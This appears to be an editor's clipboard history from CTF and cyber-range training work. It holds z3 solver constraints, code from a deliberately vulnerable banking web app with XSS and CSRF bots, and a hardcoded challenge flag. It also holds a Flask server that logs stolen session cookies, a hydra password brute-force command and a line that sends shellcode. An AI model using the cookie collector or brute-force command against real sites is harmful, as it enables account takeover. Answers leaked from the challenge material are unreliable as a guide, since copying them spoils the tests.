7f98a3cca66388d9c94c6612bbedfe5a|file:///home/neo/247ctf/reversing/restrictions.txt|1|1|^v|text
	Object.keys(flag).length == 40 && (
d4f0f3d0280c5e120eac442fc9ff75d7|file:///home/neo/CTFs/redpwn2020/smartsolver/solve.py|35|1|V|python
	if str(s.check()) is "sat":
	    m = s.model()
	    print("".join(chr(int(m[c].as_string())) for c in string))
	else:
	    print("No solution found...")
3edab8841dcd914c375d73c04e08c2f8|file:///home/neo/247ctf/reversing/restrictions.txt|1|1|V|text
	s.add((flag[37] - flag[37]) * flag[15] == 0) 
	s.add((flag[3] + flag[31]) ^ (flag[29] + flag[8]) == 234) 
	s.add((flag[32] - flag[12]) * flag[9] == -2332) 
	s.add((flag[24] - flag[27] + flag[13]) ^ flag[6] == 114) 
	s.add((flag[38] - flag[15]) * flag[33] == 800) 
	s.add((flag[34] - flag[21]) * flag[26] == 98) 
	s.add((flag[29] + flag[0]) ^ (flag[8] + flag[38]) == 248) 
	s.add((flag[21] * flag[18]) ^ (flag[7] - flag[15]) == 2694) 
	s.add((flag[28] * flag[23]) ^ (flag[19] - flag[5]) == -9813) 
	s.add((flag[34] + flag[30]) ^ (flag[37] + flag[6]) == 72) 
	s.add((flag[23] - flag[22]) * flag[12] == 4950) 
	s.add((flag[9] * flag[28]) ^ (flag[20] - flag[11]) == 5143) 
	s.add((flag[2] * flag[22]) ^ (flag[37] - flag[0]) == 2759) 
	s.add((flag[26] - flag[12]) * flag[3] == -3350) 
	s.add((flag[35] * flag[0]) ^ (flag[23] - flag[21]) == 2698) 
	s.add((flag[20] + flag[31]) ^ (flag[5] + flag[10]) == 22) 
	s.add((flag[31] * flag[19]) ^ (flag[1] - flag[2]) == -2655) 
	s.add((flag[38] - flag[14]) * flag[18] == 55) 
	s.add((flag[29] - flag[19] + flag[10]) ^ flag[2] == 93) 
	s.add((flag[13] - flag[25] + flag[30]) ^ flag[29] == 13) 
	s.add((flag[35] + flag[33]) ^ (flag[26] + flag[21]) == 249) 
	s.add((flag[17] + flag[24]) ^ (flag[34] + flag[1]) == 253) 
	s.add((flag[32] - flag[35] + flag[19]) ^ flag[1] == 0) 
	s.add((flag[22] - flag[11] + flag[3]) ^ flag[31] == 113) 
	s.add((flag[19] - flag[0]) * flag[13] == 108) 
	s.add((flag[19] - flag[17]) * flag[14] == -2475) 
	s.add((flag[31] - flag[35] + flag[16]) ^ flag[19] == 84) 
	s.add((flag[24] * flag[27]) ^ (flag[35] - flag[17]) == -5792) 
	s.add((flag[11] * flag[35]) ^ (flag[15] - flag[28]) == -2845) 
	s.add((flag[18] - flag[19] + flag[31]) ^ flag[5] == 112) 
	s.add((flag[20] - flag[6]) * flag[10] == -3933) 
	s.add((flag[39] - flag[33]) * flag[6] == 3075) 
	s.add((flag[22] + flag[1]) ^ (flag[39] + flag[14]) == 211) 
	s.add((flag[37] * flag[24]) ^ (flag[12] - flag[39]) == -5726) 
	s.add((flag[29] + flag[3]) ^ (flag[8] + flag[11]) == 195) 
	s.add((flag[26] * flag[7]) ^ (flag[10] - flag[17]) == -2375) 
	s.add((flag[11] - flag[12]) * flag[12] == -4653) 
	s.add((flag[13] * flag[5]) ^ (flag[12] - flag[25]) == 3829) 
	s.add((flag[24] * flag[0]) ^ (flag[13] - flag[23]) == -2829) 
	s.add((flag[17] + flag[12]) ^ (flag[8] + flag[14]) == 170) 
	s.add((flag[38] + flag[23]) ^ (flag[11] + flag[1]) == 245) 
	s.add((flag[22] + flag[5]) ^ (flag[21] + flag[24]) == 19) 
	s.add((flag[35] - flag[8] + flag[21]) ^ flag[30] == 85) 
	s.add((flag[18] - flag[31] + flag[28]) ^ flag[29] == 0) 
	s.add((flag[30] * flag[35]) ^ (flag[27] - flag[29]) == 5501) 
	s.add((flag[8] - flag[30] + flag[16]) ^ flag[36] == 81) 
	s.add((flag[13] * flag[18]) ^ (flag[35] - flag[38]) == -2971) 
	s.add((flag[27] - flag[14]) * flag[39] == 5875) 
	s.add((flag[34] - flag[33]) * flag[6] == -6027) 
	s.add((flag[38] * flag[1]) ^ (flag[20] - flag[10]) == -2915) 
	s.add((flag[1] - flag[1]) * flag[3] == 0) 
	s.add((flag[36] - flag[20]) * flag[8] == 2640) 
	s.add((flag[23] - flag[11] + flag[17]) ^ flag[33] == 246) 
	s.add((flag[13] - flag[38]) * flag[0] == -100) 
	s.add((flag[28] - flag[14]) * flag[31] == 2142) 
	s.add((flag[26] + flag[15]) ^ (flag[13] + flag[31]) == 8) 
	s.add((flag[36] - flag[15]) * flag[17] == 5238) 
	s.add((flag[16] - flag[30]) * flag[33] == 0) 
	s.add((flag[2] - flag[20] + flag[13]) ^ flag[6] == 76) 
	s.add((flag[10] - flag[14] + flag[31]) ^ flag[13] == 3) 
	s.add((flag[0] * flag[10]) ^ (flag[14] - flag[31]) == 2854) 
	s.add((flag[28] - flag[34] + flag[14]) ^ flag[14] == 82) 
	s.add((flag[28] - flag[25]) * flag[1] == 2444) 
	s.add((flag[34] - flag[12]) * flag[25] == -2400) 
	s.add((flag[28] * flag[38]) ^ (flag[17] - flag[4]) == 5429) 
	s.add((flag[21] - flag[21] + flag[26]) ^ flag[23] == 84) 
	s.add((flag[9] - flag[4] + flag[18]) ^ flag[35] == 47) 
	s.add((flag[28] - flag[21] + flag[1]) ^ flag[33] == 0) 
	s.add((flag[24] - flag[25] + flag[22]) ^ flag[0] == 8) 
	s.add((flag[28] - flag[25]) * flag[12] == 4653) 
	s.add((flag[1] * flag[15]) ^ (flag[10] - flag[8]) == 2498) 
	s.add((flag[5] * flag[7]) ^ (flag[15] - flag[34]) == -3429) 
	s.add((flag[8] * flag[3]) ^ (flag[23] - flag[22]) == 3671) 
	s.add((flag[25] - flag[33]) * flag[11] == -2600) 
	s.add((flag[21] + flag[12]) ^ (flag[37] + flag[28]) == 81) 
	s.add((flag[30] + flag[33]) ^ (flag[34] + flag[14]) == 162) 
	s.add((flag[6] - flag[25]) * flag[8] == 4015) 
	s.add((flag[24] - flag[7] + flag[12]) ^ flag[7] == 90) 
	s.add((flag[18] * flag[12]) ^ (flag[8] - flag[4]) == -5466) 
	s.add((flag[32] * flag[7]) ^ (flag[32] - flag[27]) == -2730) 
	s.add((flag[32] * flag[34]) ^ (flag[29] - flag[16]) == 2804) 
	s.add((flag[25] * flag[22]) ^ (flag[28] - flag[39]) == -2542) 
	s.add((flag[8] - flag[15]) * flag[6] == 861) 
	s.add((flag[20] + flag[18]) ^ (flag[25] + flag[36]) == 245) 
	s.add((flag[5] - flag[28] + flag[14]) ^ flag[39] == 97) 
	s.add((flag[30] * flag[11]) ^ (flag[16] - flag[11]) == 5216) 
	s.add((flag[11] + flag[18]) ^ (flag[7] + flag[9]) == 13) 
	s.add((flag[9] - flag[2]) * flag[30] == -200) 
	s.add((flag[12] + flag[37]) ^ (flag[9] + flag[4]) == 78) 
	s.add((flag[10] - flag[37]) * flag[38] == -2408) 
	s.add((flag[5] * flag[19]) ^ (flag[20] - flag[21]) == 3645) 
	s.add((flag[27] * flag[29]) ^ (flag[39] - flag[21]) == 10354) 
	s.add((flag[15] * flag[32]) ^ (flag[7] - flag[22]) == -2642) 
	s.add((flag[1] - flag[3] + flag[24]) ^ flag[31] == 25) 
	s.add((flag[13] - flag[0]) * flag[30] == 400) 
	s.add((flag[18] - flag[15] + flag[36]) ^ flag[28] == 12) 
	s.add((flag[34] + flag[21]) ^ (flag[12] + flag[37]) == 163) 
	s.add((flag[36] - flag[33]) * flag[14] == 110) 
	s.add((flag[2] - flag[3]) * flag[3] == -804) 
	s.add((flag[35] - flag[27] + flag[22]) ^ flag[4] == 80) 
	s.add((flag[10] + flag[9]) ^ (flag[17] + flag[2]) == 246) 
	s.add((flag[25] * flag[4]) ^ (flag[27] - flag[23]) == 4201) 
	s.add((flag[32] * flag[19]) ^ (flag[3] - flag[25]) == 2877) 
	s.add((flag[37] - flag[14]) * flag[23] == 4545) 
	s.add((flag[32] + flag[13]) ^ (flag[31] + flag[32]) == 7) 
	s.add((flag[11] - flag[25]) * flag[39] == 250) 
	s.add((flag[17] + flag[31]) ^ (flag[6] + flag[9]) == 36) 
	s.add((flag[4] + flag[27]) ^ (flag[2] + flag[31]) == 208) 
	s.add((flag[6] + flag[7]) ^ (flag[26] + flag[21]) == 206) 
	s.add((flag[19] + flag[25]) ^ (flag[22] + flag[10]) == 10) 
	s.add((flag[34] + flag[2]) ^ (flag[8] + flag[26]) == 2) 
	s.add((flag[7] + flag[5]) ^ (flag[12] + flag[14]) == 237) 
	s.add((flag[1] - flag[13]) * flag[38] == -112) 
	s.add((flag[0] - flag[19] + flag[16]) ^ flag[0] == 80) 
	s.add((flag[31] + flag[36]) ^ (flag[3] + flag[2]) == 227) 
	s.add((flag[32] - flag[3] + flag[26]) ^ flag[4] == 113) 
	s.add((flag[3] * flag[6]) ^ (flag[16] - flag[27]) == -8241) 
	s.add((flag[24] + flag[15]) ^ (flag[2] + flag[30]) == 242) 
	s.add((flag[11] + flag[21]) ^ (flag[31] + flag[20]) == 12) 
	s.add((flag[9] - flag[26] + flag[23]) ^ flag[30] == 13)
971dc5f24efe15fa5f00ce3e2ec60225|file:///home/neo/247ctf/reversing/sol_lock.py|134|5|V|python
	    print("".join(chr(int(m[c].as_string())) for c in string))
8b852c3afc106701e98c72a22c262689|file:///home/neo/247ctf/reversing/sol_lock.py|136|5|V|python
	    # print("".join(chr(int(m[c].as_string())) for c in string))
c62575d93ceab8ef551cb3fe0a3aea63|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/82a9d051916e08825a8410cd89bb1b13/secret.html|1|5|v|html
	AUTHORIZED
ab52ca15b49f4c8717a6c8b4be7d01f2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/82a9d051916e08825a8410cd89bb1b13/secret.html|1|20|v|html
	PERSONS 
cb9129fecefd630e9e5495cc0890d7bb|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/82a9d051916e08825a8410cd89bb1b13/secret.html|2|5|v|html
	Bank future expansion plans
d97623d172f087d9640da9acd38830ff|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/static/82a9d051916e08825a8410cd89bb1b13/secret.html|4|1|V|html
	<p></p>
38a2a6b2e02238c0f213676a7cff3aed|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/server.py|193|1|V|python
	@app.route('/makeAdmin', methods=['GET'])
	def makeAdmin():
	    if 'role' in session.keys():
	        if session['role'] == 'admin':
	            print('success')
	            # Get user to elevate:
	            user = request.args.get('user')
	            print(user)
	
	            # Set parameters for query
	            role = 'admin'
	            params = (role, user)
	
	            # Connect to db
	            conn = sqlite3.connect('deflect.db')
	            c = conn.cursor()
	            # Execute query
	            c.execute('''UPDATE users SET role = ? WHERE username = ? ''', params)
	            conn.commit()
	            conn.close()
	
	            return "<html><body><div><h2>User privileges elevated!</h2><br>Please click <a href='/profile'>here</a> to return to your profile.</div></body></html>"
	
	        else:
	            return "<html><body><div><h2>Only Admins can change other users' roles!</h2><br>Please click <a href='/profile'>here</a> to return to your profile.</div></body></html>"
	    else:
	        return redirect(url_for('index'))
	
	
cfbe19b2b54f7a141203c6d8378f8c39|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|309|1|V|python
	    BASE_DIR = '/'
	
	    if path.startswith(BASE_DIR) == False:
	        path = os.path.join(os.getcwd(),'currencies', 'stop')
	
	        with open(path, 'rb') as f:
	            raw = f.read()
	            encoded = base64.b64encode(raw)
	        
	        return render_template('currencies.html', encoded=encoded.decode('ascii'))
	
ca002bfe286aeba74d99834365897096|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|308|5|V|python
	    # change for prod
eeba2ff87182e8d4f2eabd71cc343a8a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|333|23|v|python
	'''UPDATE users SET role = ? WHERE username = ? '''
2b69b94a42bfac4b1343b0fa21d5b4f0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|329|1|V|python
	            # Connect to db
	            conn = sqlite3.connect('treasure.db')
	            c = conn.cursor()
	            # Execute query
	            c.execute(, params)
	            conn.commit()
	            conn.close()
8855fca044e910e6c0647d4a78ac3592|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/bot/xssbot.js|7|1|V|javascript
	phantom.addCookie({
	    'name': 'Flag',
	    'value': 'CTF{In_tH1s_c4sE_Reflect_rath3r_Th4n_Defl3cT}',
	    'domain': '127.0.0.1',
	    'path': '/',
	    'httponly': false
	
	});
3780defe6e93be068249cce02a22cdfa|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/bot/csrfbot.js|4|1|V|javascript
	// var url = 'http://localhost:5000/makeAdmin?user=neo'
8a5446dc41ecbd3a4a470cab5c9a5aa0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/currencies.html|7|1|V|htmldjango
	    <section id="three-columns">
	        <div class="three-columns-wrapper">
	            <article>
	              <h3>Search Currency to find conversion rate from EURO</h3>
	            </article>
	
	            <article>            	               
	                  <form action="/currencies/getCurrency" method="POST">
	                    <fieldset>
	                      <div class="form-group">
	                        <label for="username">Convert Euro to:</label>
	                          <select id="currency" name="currency">
	                            <option value="usd">US Dollars</option>
	                            <option value="pnd">Pound sterling</option>
	                            <option value="btc">Bitcoin</option>
	                            <option value="yuan">Chinese yuan</option>
	                          </select>
	                      </div>
	                      <div class="form-actions">
	                        <input type="submit" value="Retrieve" class="btn btn-primary">
	                      </div>
	                    </fieldset>
	                  </form>
	            </article>
	            
	            <article>            	     
	              <img style="width:300px; height:200px" src="data:image/jpeg;base64, {{ encoded }}">
	            </article>
	
	        </div><!-- end three columns-wrapper -->
	        <br class="clear"/>
a3929ff1295a51882fa0384137610343|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|10|19|v|htmldjango
	Search Currency to find conversion rate from EURO
ee1548b5c788e385bcbb26646f61ebb6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|14|1|V|htmldjango
	                  <form action="/currencies/getCurrency" method="POST">
	                    <fieldset>
	                      <div class="form-group">
	                        <label for="username">Convert Euro to:</label>
	                          <select id="currency" name="currency">
	                            <option value="usd">US Dollars</option>
	                            <option value="pnd">Pound sterling</option>
	                            <option value="btc">Bitcoin</option>
	                            <option value="yuan">Chinese yuan</option>
	                          </select>
	                      </div>
	                      <div class="form-actions">
	                        <input type="submit" value="Retrieve" class="btn btn-primary">
	                      </div>
	                    </fieldset>
	                  </form>
9df3e34c841a11ac713bc2f02bd6d0e4|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|17|13|V|htmldjango
	              <img style="width:300px; height:200px" src="data:image/jpeg;base64, {{ encoded }}">
d455357e584911eb5c3929c85bc6a3c6|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|27|1|V|htmldjango
	              <form action="/contact" method="POST">
	                <fieldset>
	                  <div class="form-group">
	                    <label for="changeName">Contact Message</label>
	                    <input type="text" id="contactMessage" name="contactMessage" class="form-control">
	                  </div>
	                  <div class="form-actions">
	                    <input type="submit" value="Contact" class="btn btn-primary">
	                  </div>
	                </fieldset>
	              </form>
a2f71836272fe9592e8867eff250bbb9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|32|1|V|htmldjango
		<div class="col-md-4">
	          <div class="panel panel-primary" style="margin-top:00px">
	            <div class="panel-heading">
	              <h3>Contact Us</h3>
	            </div>
	            <div class="panel-body">
	            </div>
	          </div>
	    </div>
6be5e87c807c5ee1515026b74174dadf|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/templates/profile.html|111|1|V|html
	              <form action="/contact" method="POST">
	                <fieldset>
	                  <div class="form-group">
	                    <label for="Contact">Send buggy URL for inspection (Optional) </label>
	                    <input type="text" id="buggyURL" name="buggyURL" class="form-control">
	                  </div>
	                  <div class="form-actions">
	                    <input type="submit" value="Contact" class="btn btn-primary">
	                  </div>
	                </fieldset>
	              </form>
372cb664be471cbe8417954261b717b0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|17|33|v|htmldjango
	changeName
bbaff12800505b22a853e8b7f4eb6a22|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|31|33|v|htmldjango
	Contact
156f2f673c534e6876c14d86a9878d9e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|200|5|V|python
	    # Check if we want to trigger CSRF or XSS
b9c38b5f03593c419b41a6628e84ef12|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|207|5|V|python
	    # Trigger bot
39788d62a49196e9fb138545f026ff93|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/templates/profile.html|14|1|V|html
	      {% if role == "admin" %}
	      {% set color='#ba1316' %}
	      {% set text_role='Admin' %}
	      <a class="navbar-brand" href="/admin">Admin</a>
	      {% else %}
	      {% set color='#337ab7' %}
	      {% set text_role='User' %}
	      {% endif %}   
45bba25c300596e3d161660a34f4b1b3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|3|31|v|htmldjango
	 {% set color='#ba1316' %}
e04abcdf9658196c9ecf77daeff780b1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|4|7|V|htmldjango
	      {% set text_role='Admin' %}
fd30f29289feb864d7487a478654fc9b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|5|1|V|htmldjango
	      {% else %}
	      {% set color='#337ab7' %}
	      {% set text_role='User' %}
77f45322875f778522742e01649706f0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|4|7|V|htmldjango
	      <a class="navbar-brand" href="/admin">Admin</a>
9a7774745cb76be13bbc075325a392af|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|31|72|v|htmldjango
	 (Optional) 
bb46dfece192bbd40a7ae3f110239547|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/contact.html|11|1|V|htmldjango
	                  <br>
e16735c56dd9e1363e4d6a2fce4dda9f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|269|5|V|python
	    print(abs_path)
de1660207384eebd87bf379e290096a2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|316|13|V|python
	            print('success')
6a0cb6512fa6d164e0699ae23335432e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|318|13|V|python
	            print(user)
38f5554bfa93eb8d3a7acf2efb392b5d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/test|1|1|V|html
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="/css/styles.css" type="text/css" media="screen" />
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media="screen" />
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="\/js\/vendor\/1.7.2.jquery.min.js"><\/script>')</script>
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
		<body>        						<!-- the header -->
	        <header>
	            
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/home">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/currencies">Currency Converter</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="/home">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p>           
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/home">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/currencies">Currency Converter</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	               	</ul>
	            </nav>
	            
	        </header>
	
			<section id="spacer">        	         
				<div class="spacer-wrapper">				
	                
	        
	   
	<form action="/logout">
	    <input type="submit" name="start_search" class="button" value="Logout"/>
	</form>				
	<form action="/search">
	    <input type="text" name="from_user" for="from_user" placeholder="Search for past transactions of user..."/>
	    <input type="submit" name="start_search" class="button" value="Search"/>
	</form>				
	
	    
				</div>
			</section>
	        
	        
	    <section id="three-columns">
	        <div class="three-columns-wrapper">
	            <article>
	              <h3>Search Currency to find conversion rate from EURO</h3>
	            </article>
	
	            <article>            	               
	                  <form action="/currencies/getCurrency" method="POST">
	                    <fieldset>
	                      <div class="form-group">
	                        <label for="username">Convert Euro to:</label>
	                          <select id="currency" name="currency">
	                            <option value="usd">US Dollars</option>
	                            <option value="pnd">Pound sterling</option>
	                            <option value="btc">Bitcoin</option>
	                            <option value="yuan">Chinese yuan</option>
	                          </select>
	                      </div>
	                      <div class="form-actions">
	                        <input type="submit" value="Retrieve" class="btn btn-primary">
	                      </div>
	                    </fieldset>
	                  </form>
	            </article>
	            
	            <article>            	     
f4f6dbd468d8ee87a29cee9196ba6249|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/test|134|15|V|html
	            </article>
	
	        </div><!-- end three columns-wrapper -->
	        <br class="clear"/>
	    
	
	        <br class="clear"/>        
	
	        <footer class="footer-distributed">
	            
	
	        	<div class="footer-wrapper">        	
	
					<p class="footer-links">
					
						<a href="/home">Home</a>
						¬∑
						<a href="/profile">Profile</a>
						¬∑
	                    <a href="/currencies">Currency Converter</a>
	                    .
						<a href="/contact_us">Contact Us</a>
						¬∑					
	
					</p>
	
					<p>Best Banking App; 2020</p>
						
					<div class="footer-right">
							<!-- the social media icons from Bootstrap CDN: -->
						<a href="#"><i class="fa fa-facebook"></i></a>
						<a href="#"><i class="fa fa-twitter"></i></a>
						<a href="#"><i class="fa fa-linkedin"></i></a>
						<a href="#"><i class="fa fa-github"></i></a>
	
					</div>
				
				</div><!-- end footer-wrapper -->
	
	        
			</footer>
	                
		</body>
	</html>
9932d3ade0dd602ce0dba17289fdd142|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/test|1|15|^v|html
	<img style="width:300px; height:200px" src="data:image/jpeg;base64, 
59bdcf84da7d88f9dd3aa1f9ea56b20b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/example_code/app_RUNESEC/cookie-grabber.py|1|1|V|python
	from flask import Flask, request, redirect
	
	app = Flask(__name__)
	
	@app.route('/')
	def cookie():
	    cookie = request.args.get('c')
	    f = open("cookies.txt", "a")
	    f.write(cookie + '\n')
	    f.close()
	    return redirect('127.0.0.1:5000/')
	
	
	if __name__ == '__main__':
	    app.run(host = '0.0.0.0', port=4000)
8a5769e307334100c666e97431f7ec70|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|202|15|v|python
	request.form.get('buggyURL')
e583ca3d1f5e61913ef01f8a4a2113f9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/post.txt|1|5|v|text
	/search?from_user=aaa&start_search=Search 
17d93cc4e6ed9378a1bfff656b75fa53|file:///home/neo/vimwiki/Online%20credentials%20brute%20forcing.wiki|7|23|v|vimwiki
	hydra -l <username> -P <password list> <ip> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=errormsg" -V
f70c88ef8e246473a7634d6a32c0fe8b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|65|1|V|python
	        return render_template('login.html', error='0')
256fb8602f5085d71195ba3183de541b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|2|1|V|htmldjango
	{% if role == "admin" %}
5c8ee16f68b00adfda9992c5b496f57c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/search_bar.html|3|1|V|htmldjango
	<div style="float: left; width: 30%"><p style="color:red"><b>Welcome admin!</b></p></div>
6b37a722ecd461f9342d8ef20c35cb62|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|11|17|V|htmldjango
	                <div><p style></div>
db2629fcb9c6c5f29bff22b3e6a25fc5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|9|65|v|htmldjango
	Welcome admin!
29a7e96467b69a9f5a93332e29e9b0de|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|8|23|v|htmldjango
	role
1999c5865ed24a44ba7cabec3fdab8b0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|84|9|V|python
	        print('wroong')
db6d802636c5d6ee4b78f767164e0b58|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|167|1|V|python
	    name = request.form.get('name')
	    # Connect to db
	    conn = sqlite3.connect('treasure.db')
	    c = conn.cursor()
	    # Set parameters for query
e2f555216cf174374d352b6328380b74|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|220|14|V|python
	    conn.commit()
	    conn.close()
2eda597d8297229132f57fdb2bc9bc8c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|215|5|V|python
	    # Connect to db
	    conn = sqlite3.connect('treasure.db')
	    c = conn.cursor()
	    params = (newName, user)
987abebc4804c14e3c47e5be0a2485bd|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|216|5|V|python
	    conn = sqlite3.connect('treasure.db')
c173eeb8b7ae7a51710e7b5b10ed822d|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|215|5|V|python
	    # Connect to db
0f24ae9441d2f340826e79fde6cdd0c9|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|168|5|V|python
	    # Execute query
f2bc6d3be91ad0df77a84be907276900|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|8|1|V|htmldjango
	                {% if error == "1" %}
	                <div style="width: 40%"><p style="color:red"><b>Wrong username or password</b></p></div>
	                {% endif %}
97cce3a3b74d5cabef4e25037dfb1720|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/templates/login.html|12|65|v|htmldjango
	Wrong username or password
abff0df58f980e7bd7189abf681b507a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|165|1|V|python
	    email = request.form.get('email')
eed42bc12f41b0ea525983335e8e8a71|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|169|4|V|python
	    params = (username)
d352780a2a024cfe6d9976891bcadb1c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|164|1|V|python
	    password = request.form.get('password')
	    email = request.form.get('email')
	    name = request.form.get('name')
	    role = 'normal'
62505e8466e114a18f861425848a1584|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|174|1|V|python
	    if exist is not None:
	        return render_template('login.html', error='0', exists='1')
e7f100257bf647921f75b3bdc468b03b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|168|5|V|python
	    print(exist)
199871b1796926859a64bd74070f8d3e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|178|14|v|python
	executeQuery('''INSERT into users (username,password, role, name, email) VALUES (?,?,?,?,?)''', params)
fd6f2ad5434f805f1481e4034360941a|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|179|5|V|python
	    print(result)
4c5578ea19242a7525bc6f995938a24c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|179|1|V|python
	
	    if result:
	        return redirect(url_for('profile'))
c60ba89db6aca3099a1037aebc4da968|file:///home/neo/247ctf/pwnable/sol_pivot.py|65|1|V|python
	io.recvuntil('?\n')
	io.sendline(shellcode)
	io.recvuntil('?\n')
